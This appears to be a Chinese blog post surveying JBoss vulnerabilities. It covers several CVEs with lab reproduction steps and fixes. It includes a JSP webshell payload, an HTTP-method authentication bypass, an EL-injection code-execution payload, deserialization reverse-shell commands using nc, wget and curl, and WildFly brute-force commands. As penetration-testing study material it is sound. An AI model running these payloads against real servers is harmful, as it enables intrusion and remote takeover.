---
title: Jboss漏洞汇总
date: 2020-07-05 19:22:15
---

JBoss是一套开源的企业级 Java 中间件系统，用于实现基于 SOA 的企业应用和服务

JBoss AS 开源社区版本，发布比较频du繁。JBoss 7 ，先后发布了 7.0.0, 7.0.1, 7.0.2, 7.1.0, 7.1.1, 7.1.2, 7.1.3, 7.2.0，其中 7.1.1 比较经典，7.2.0 是 JBoss EAP 6.1 的基础zhi，但7.1.2, 7.1.3, 7.2.0 只是源代码dao打了 Tag，并没提供开放下载。

JBoss EAP（Enterprise Application Platform） 在开源版本上构建的企业版本，目前Redhat 已经将 JBoss EAP 放在 JBoss.org 开放下载，开发人无需注册 Redhat （之前是必须有 Redhat.com 账号才能下载 JBoss EAP）。商用请咨询 Redhat 客服。

Wildfly 是 JBoss AS 新的项目名称，从 8 开始，新的 JBoss AS 正式有一个名字，叫 WildFly， 目前已经发布 8 Beta 版本，针对开发人员的 Java EE 7 功能已经完全实现。

### 环境搭建

#### jdk安装

```shell
https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html
```

![image-20200629230736581](/images/Jboss/image-20200629230736581.png)

```shell
# mkdir /usr/java
# cp jdk-6u32-linux-x64-rpm.bin /usr/java/
# chmod +x jdk-6u32-linux-x64-rpm.bin
# ./jdk-6u32-linux-x64-rpm.bin
# ls
default                     latest                                 sun-javadb-demo-10.6.2-1.1.i386.rpm
jdk1.6.0_32                 sun-javadb-client-10.6.2-1.1.i386.rpm  sun-javadb-docs-10.6.2-1.1.i386.rpm
jdk-6u32-linux-amd64.rpm    sun-javadb-common-10.6.2-1.1.i386.rpm  sun-javadb-javadoc-10.6.2-1.1.i386.rpm
jdk-6u32-linux-x64-rpm.bin  sun-javadb-core-10.6.2-1.1.i386.rpm
# vi /etc/profile
export JAVA_HOME=/usr/java/jdk1.6.0_32
export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar
export PATH=$JAVA_HOME/bin:$PATH
# source /etc/profile
# java -version
java version "1.6.0_32"
Java(TM) SE Runtime Environment (build 1.6.0_32-b05)
Java HotSpot(TM) 64-Bit Server VM (build 20.7-b02, mixed mode)
OK
//也可以使用yum进行安装jdk
# yum -y list java*			//会列出所有jdk版本信息
//安装指定jdk
# yum -y install java-1.7.0-openjdk*
# java -version
java version "1.7.0_261"
OpenJDK Runtime Environment (rhel-2.6.22.2.el7_8-x86_64 u261-b02)
OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
```

#### JBoss版本

```shell
//JBoss全版本下载
https://jbossas.jboss.org/downloads
https://teddysun.com/260.html
//6.0版本
https://sourceforge.net/projects/jboss/files/JBoss/JBoss-6.0.0.Final/
//4.2.3版本
http://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA.zip/download
```

版本6.0

JBoss-6.0.0.Final

![image-20200629174602625](/images/Jboss/image-20200629174602625.png)

#### JBoss安装

```shell
# unzip jboss-as-distribution-6.0.0.Final.zip
# ll
# 版本替换须重启系统，以免无法访问最新替换系统。或启动run时报错。
# vim /etc/profile
export JBOSS_HOME=/usr/local/jboss-6.0.0.Final/
export PATH=$PATH:$JBOSS_HOME/bin
# source /etc/profile
//启动
# ./run.sh -b 0.0.0.0
//curl请求尝试
# curl -I http://127.0.0.1:8080/
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
X-Powered-By: Servlet/3.0; JBossAS-6
Accept-Ranges: bytes
ETag: W/"1554-1293496144000"
Last-Modified: Tue, 28 Dec 2010 00:29:04 GMT
Content-Type: text/html
Content-Length: 1554
Date: Tue, 30 Jun 2020 12:22:53 GMT
//关闭本地防火墙防止无法访问
# systemctl stop firewalld.service
```

![image-20200630134941050](/images/Jboss/image-20200630134941050.png)

#### JavaDeserH2HC

此工具主要用于检测和测试反序列化类漏洞，项目地址已经贴到下面。

[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)

### 漏洞分类实战

#### CVE-2006-5750

##### 漏洞描述

CVE-2007-1036漏洞相同，CVE-2006-5750漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。

##### 影响范围

##### 漏洞原理

##### 漏洞检测

##### 漏洞修复

1、参考CVE-2010-0738漏洞

#### CVE-2007-1036

JMX Console HtmlAdaptor Getshell

##### 漏洞描述

由于JBoss对 /jmx-console/HtmlAdaptor 路径未做任何认证措施，导致这个服务完全对外开放，可直接访问控制台部署shell。

##### 影响范围

全版本

##### 漏洞原理

此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。

##### 漏洞实战

1、URL访问

```shell
http://172.16.144.135:8080/jmx-console/
```

![image-20200630141919387](/images/Jboss/image-20200630141919387.png)

2、创建war包木马

```shell
➜  jsp jar -cvf muma.war shell.jsp
```

3、部署远程木马

```
部署远程war必须确保war提供web能够访问否则怎么叫远程部署呢？
```

![image-20200630143911494](/images/Jboss/image-20200630143911494.png)

![image-20200630143935231](/images/Jboss/image-20200630143935231.png)

<center>部署完成结果</center>
4、访问木马

```shell
http://172.16.144.135:8080/muma/shell.jsp
//如出现500即为部署成功只是无法解析
```

![image-20200630144229517](/images/Jboss/image-20200630144229517.png)

5、管理工具连接

![image-20200630144201038](/images/Jboss/image-20200630144201038.png)

##### 漏洞修复

因jboss默认未设置密码，导致jmx-console可远程部署war并导致被攻击。

1、开启安全配置

```shell
//注释去掉(6.x版本修改下面文件)
/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml
//4.x版本修改下面文件
/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml
```

![image-20200630145646406](/images/Jboss/image-20200630145646406.png)

2、web.xml配置

```shell
/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/web.xml
```

![image-20200630145856647](/images/Jboss/image-20200630145856647.png)

3、设置账号及密码

```shell
//修改账号及密码（默认是admin/admin）
server/default/conf/props/jmx-console-users.properties
```

![image-20200630150052719](/images/Jboss/image-20200630150052719.png)

4、访问

````shell
//修改以上配置后记得重启Jboss
//直接停止run.sh
//进程查看
# ps aux | grep jboss
# kill -9 PID
````

![image-20200630150711860](/images/Jboss/image-20200630150711860.png)

#### CVE-2010-0738

##### 漏洞描述

JBoss默认仅对“GET”和“POST”方法启用安全限制。

使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证，直接调用jmx-console实现的任何功能。

注意：如果JMX控制台回复HTTP 500错误，则表示请求已正确处理。

##### 影响范围

JBossAS < 4.3

##### 漏洞原理

JBoss默认仅对“GET”和“POST”方法启用安全限制；使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证

```shell
jboss-4.2.3.GA/server/default/deploy/jmx-console.war/WEB-INF/web.xml
```

![image-20200701103827156](/images/Jboss/image-20200701103827156.png)

##### 漏洞检测

1、URL请求

```shell
http://172.16.144.139:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository
```

![image-20200701142719465](/images/Jboss/image-20200701142719465.png)

2、参数对应值

```shell
# 路径
shell.war
# 文件名
shell
# 文件后缀
.jsp
# 文件内容
<%Runtime.getRuntime().exec(request.getParameter("i"));%>

# 如POST提交需认证，修改请求方法未HEAD并复制POST数据至URL处
action=invokeOp&name=jboss.admin:service=DeploymentFileRepository&methodIndex=6&arg0=../jmx-console.war/&arg1=shell&arg2=.jsp&arg3=<%Runtime.getRuntime().exec(request.getParameter("i"));%>&arg4=True
# 访问(获取当前目录文件夹及文件)
http://172.16.144.139:8080/jmx-console/shell.jsp?i=touch%201.txt
```

![image-20200701153249170](/images/Jboss/image-20200701153249170.png)

![image-20200701152708158](/images/Jboss/image-20200701152708158.png)

3、shell新建文件

```shell
http://172.16.144.139:8080/shell/shell.jsp?i=touch%201.txt
```

![image-20200701152747850](/images/Jboss/image-20200701152747850.png)

![image-20200701152836122](/images/Jboss/image-20200701152836122.png)

##### 漏洞修复

1、升级最新版本

2、设置登录认证(参考CVE-2007-1036修复)

#### CVE-2010-1871

##### 漏洞描述

`JBossSeam`是一个`JavaEE5`框架，把JSF与`EJB3.0`组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。

`JBossSeam`处理某些参数化`JBossEL`表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的`JBossSeam`用户访问特制的网页，就可能导致执行任意代码。

##### 影响范围

JBoss AS = 4.3.0（4.3.0属于企业版，导致部分环境没法搭建复现）

```shell
//4.3.0等版本下载
http://ftp.riken.jp/Linux/redhat/ftp.redhat.com/jboss/eap/4.3.0/en/source/
```

##### 漏洞原理

漏洞是通过`seam`组件中插入`#{payload}`进行模板注入，通过Java反射机制来获取到（`Java.lang.Runtime.getRuntime().exec()`方法），从而可以传入任何想要执行的命令。

##### 漏洞检测

1、漏洞位置描述

漏洞是通过seam组件中插入#{payload}进行模板注入，可以在以下链接中插入要执行的方法，通过Java反射机制来获取到（`Java.lang.Runtime.getRuntime().exec()`方法）,从而可以传入任何想要执行的命令。

```shell
/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23{}的#{}
```

2、PoC

cmd代表传入的远程命令。在`/admin-console/login.seam`路径下，POST传入构造好的`payload`，即可对此漏洞利用。

```java
actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('Java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('Java.lang.Runtime')).exec(cmd)}
```

##### 漏洞修复

1、补丁修复

#### CVE-2013-4810

##### 漏洞描述

此漏洞和`CVE-2015-7501`漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中`JMXInvokerServlet`和`EJBInvokerServlet`利用的是`org.jboss.invocation.MarshalledValue`进行的反序列化操作，

而`web-console/Invoker`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进行反序列化并上传构造好文件。

##### 影响范围

JBoss AS 6.X

##### 漏洞原理



##### 漏洞检测

1、参考CVE-2015-7501

```
//漏洞路径
/invoker/EJBInvokerServlet
http://172.16.144.157:8080/invoker/EJBInvokerServlet
```

![image-20200702153308520](/images/Jboss/image-20200702153308520.png)

2、反弹shell

直接参考CVE-2015-7501

##### 漏洞修复

1、[补丁](https://access.redhat.com/security/cve/cve-2015-7501)

#### CVE-2015-7501

##### 漏洞描述

由于`JBoss`中`invoker/JMXInvokerServlet`路径对外开放，JBoss的`jmx`组件⽀持Java反序列化导致产生漏洞。

##### 影响范围

JBoss AS 6.x

##### 漏洞原理

由于`JBoss`中`invoker/JMXInvokerServlet`路径对外开放

##### 漏洞检测

1、PoC

浏览器直接访问域名，如出现下载文档即可确定存在漏洞。

```
http://172.16.144.156:8080/invoker/JMXInvokerServlet
```

![image-20200702122358123](/images/Jboss/image-20200702122358123.png)

2、反弹shell

```shell
# nc -lvnp 5555(攻击主机执行监听)
//攻击主机目录下下载
# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip
# unzip JavaDeserH2HC.zip
# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)
# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:5555				(攻击主机及端口号)
# curl http://172.16.144.157:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![image-20200702134459047](/images/Jboss/image-20200702134459047.png)

##### 漏洞修复

1、[补丁](https://access.redhat.com/security/cve/cve-2015-7501)

#### CVE-2017-7504

##### 漏洞描述

JBoss AS 4.x及之前版本中，JbossMQ实现过程的`JMS over HTTP Invocation Layer`的
HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤
该漏洞执⾏任意代码。

##### 影响范围

JBoss AS 4.x之前版本

##### 漏洞原理

JBoss AS 4.x及之前版本中，JbossMQ实现过程的`JMS over HTTP Invocation Layer`的
HTTPServerILServlet.java⽂件存在反序列化漏洞。

##### 漏洞检测

1、PoC

访问域名，如出现以下返回可能存在漏洞。

```
172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet
```

![image-20200702140433362](/images/Jboss/image-20200702140433362.png)

2、反弹shell

```shell
# nc -lvnp 6666(攻击主机执行监听)
//攻击主机目录下下载
# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip
# unzip JavaDeserH2HC.zip
# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)
# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:6666				(攻击主机及端口号)
# curl http://172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![image-20200702142036913](/images/Jboss/image-20200702142036913.png)

![image-20200702142043798](/images/Jboss/image-20200702142043798.png)

##### 漏洞修复

1、版本升级



#### CVE-2017-12149

##### 漏洞描述

此漏洞主要是由于`jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet`目录下的`ReadOnlyAccessFilter.class`文件中的`doFilter`方法，再将序列化传入`ois`中，并没有进行过滤便调用了`readObject()`进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。

##### 影响范围

JBossAS 5.x

JBossAS 6.x

##### 漏洞原理

该漏洞存在于JBoss AS的HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

##### 漏洞检测

1、版本确定

![image-20200630152601209](/images/Jboss/image-20200630152601209.png)

2、PoC访问

````shell
http://172.16.144.135:8080/invoker/readonly
//如出现500可确定目标主机存在漏洞
````

![image-20200630152657545](/images/Jboss/image-20200630152657545.png)

3、反弹shell

```shell
# nc -lvnp 8888(攻击主机执行监听)
//攻击主机目录下下载
# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip
# unzip JavaDeserH2HC.zip
# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)
# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.135:8888				(攻击主机及端口号)
# curl http://172.16.144.135:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![image-20200630221608353](/images/Jboss/image-20200630221608353.png)

![image-20200630221503084](/images/Jboss/image-20200630221503084.png)

##### 漏洞修复

1、删除http-invoker.sar组件

2、版本升级(此漏洞只存在AS5、AS6)

#### Administration Console 弱口令

##### 漏洞描述

`Administration Console`存在默认密码`admin admin`,我们可以登录到后台部署war包`getshell`

##### 影响范围

全版本

##### 漏洞原理

JBoss默认Console是admin/admin.

##### 漏洞检测

1、访问以下URL

```shell
http://172.16.144.157:8080/jmx-console/
```

![image-20200702151249993](/images/Jboss/image-20200702151249993.png)

2、远程部署war

这部分直接参考`CVE-2007-1036`操作基本一致

##### 漏洞修复

1、修改默认账户及密码（足够强壮）

#### JBoss >7.x弱口令及爆破

##### 漏洞描述

`jboss`从8开始正式更名为`WildFly` ,在`WildFly8`之后的版本添加控制台用户时默认就会执行强密码策略,所以相对于之前低版本的`jboss`,针对`WildFly`之后版本的弱口令推荐`wildPwn`自动化爆破工具。

##### 漏洞范围

JBoss >7.x（wildFly所需jdk版本为7及以上才行）

##### 漏洞原理

JBoss 8之后开始更名为`WildFly`其默认采用强密码策略，但也会存在可爆破风险。

```shell
//部署指定目录
/usr/local/wildfly-8.0.0.Final
//修改环境路径
export JBOSS_HOME=/usr/local/wildfly-8.0.0.Final/
export PATH=$PATH:$JBOSS_HOME/bin
//添加新账户
# ./add-user.sh
What type of user do you wish to add?
 a) Management User (mgmt-users.properties)
 b) Application User (application-users.properties)
(a): a

Enter the details of the new user to add.
Using realm 'ManagementRealm' as discovered from the existing property files.
Username : admin
The username 'admin' is easy to guess
Are you sure you want to add user 'admin' yes/no? yes
Password recommendations are listed below. To modify these restrictions edit the add-user.properties configuration file.
 - The password should not be one of the following restricted values {root, admin, administrator}
 - The password should contain at least 8 characters, 1 alphanumeric character(s), 1 digit(s), 1 non-alphanumeric symbol(s)
 - The password should be different from the username
Password :
JBAS015269: Password must have at least 8 characters!
Are you sure you want to use the password entered yes/no? yes
Re-enter Password :
What groups do you want this user to belong to? (Please enter a comma separated list, or leave blank for none)[  ]:
About to add user 'admin' for realm 'ManagementRealm'
Is this correct yes/no? yes
Added user 'admin' to file '/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-users.properties'
Added user 'admin' to file '/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-users.properties'
Added user 'admin' with groups  to file '/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-groups.properties'
Added user 'admin' with groups  to file '/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-groups.properties'
Is this new user going to be used for one AS process to connect to another AS process?
e.g. for a slave host controller connecting to the master or for a Remoting connection for server to server EJB calls.
yes/no? yes
To represent the user add the following to the server-identities definition <secret value="dG9vcg==" />

//启动JBoss(静默启动，程序会在后台运行)
# ./standalone.sh -Djboss.bind.address=0.0.0.0 -Djboss.bind.address.management=0.0.0.0&
```

##### 漏洞检测

1、URL访问

```shell
//默认监听端口在9990
http://172.16.144.158:9990/
```

![image-20200702202856723](/images/Jboss/image-20200702202856723.png)

2、爆破

```shell
# git clone https://github.com/hlldz/wildPwn.git
# cd wildPwn
# python wildPwn.py -m brute --target 172.16.144.183 --port 8080 -user userList.txt -pass passList.txt

nmap ‐n -Pn ‐‐script=wildfly‐brute.nse ‐‐script‐args "userdb=userList.txt,passdb=pass.txt,hostname=domain.com" 172.16.144.183 -p9990
```

貌似这个工具并没法实现爆破。

##### 漏洞修复

1、配置强口令

2、限制来源IP

### 总结

以上CVE汇总根据网上各大佬汇总得到，其中部分CVE使用的`JavaDeserH2HC`工具已经在环境搭建部分贴出；还有很多其他工具请自行github或google了。

### 参考

```
https://www.freebuf.com/articles/web/240174.html
https://bugzilla.redhat.com/show_bug.cgi?id=615956
```

